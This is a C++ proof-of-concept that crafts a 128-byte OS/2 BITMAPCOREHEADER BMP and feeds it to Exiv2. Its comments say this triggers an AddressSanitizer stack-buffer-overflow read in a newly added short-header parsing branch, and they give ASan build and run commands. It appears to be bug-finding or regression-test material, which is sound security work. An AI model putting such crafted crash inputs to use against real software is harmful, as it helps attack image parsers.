// PoC: feeds a valid OS/2 1.x / Windows 2.x BITMAPCOREHEADER BMP (12-byte DIB
// header) through the public Exiv2 API (ImageFactory::open + readMetadata).
//
// On the patched tree the BITMAPCOREHEADER code path reads the 16-bit height
// field at offset +4 of a 4-byte stack buffer, reading 2 bytes past its end
// -> AddressSanitizer stack-buffer-overflow.
//
// On the parent tree there is no short-header branch (the 26-byte header is
// read into a 26-byte buffer and parsed in bounds), so this input is handled
// without any out-of-bounds access.
//
// Build (against the ASan-instrumented libexiv2):
//   c++ -std=c++17 -fsanitize=address -g pocs/newbug.cpp \
//       -I include -I build-asan -L build-asan/lib -lexiv2 -o pocs/newbug
// Run:
//   LD_LIBRARY_PATH=build-asan/lib ASAN_OPTIONS=detect_leaks=0 pocs/newbug

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>

#include <exiv2/exiv2.hpp>

static void put16(uint8_t* p, uint16_t v) {
  p[0] = static_cast<uint8_t>(v & 0xff);
  p[1] = static_cast<uint8_t>((v >> 8) & 0xff);
}

static void put32(uint8_t* p, uint32_t v) {
  p[0] = static_cast<uint8_t>(v & 0xff);
  p[1] = static_cast<uint8_t>((v >> 8) & 0xff);
  p[2] = static_cast<uint8_t>((v >> 16) & 0xff);
  p[3] = static_cast<uint8_t>((v >> 24) & 0xff);
}

int main() {
  // Valid OS/2 BITMAPCOREHEADER bitmap (padded with pixel data so that all
  // image-type probes have enough bytes to read their signatures).
  uint8_t bmp[128];
  std::memset(bmp, 0, sizeof(bmp));
  bmp[0] = 'B';
  bmp[1] = 'M';
  put32(bmp + 2, sizeof(bmp));  // file size
  put32(bmp + 6, 0);            // reserved
  put32(bmp + 10, 26);          // pixel data offset
  put32(bmp + 14, 12);          // DIB header size == BITMAPCOREHEADER
  put16(bmp + 18, 4);           // width  (16-bit)
  put16(bmp + 20, 2);           // height (16-bit)
  put16(bmp + 22, 1);           // planes
  put16(bmp + 24, 24);          // bits per pixel

  const char* path = "/tmp/poc_core.bmp";
  FILE* f = std::fopen(path, "wb");
  if (!f) {
    std::perror("fopen");
    return 2;
  }
  std::fwrite(bmp, 1, sizeof(bmp), f);
  std::fclose(f);

  auto image = Exiv2::ImageFactory::open(path);
  image->readMetadata();
  std::printf("pixelWidth=%u pixelHeight=%u\n", image->pixelWidth(), image->pixelHeight());
  return 0;
}
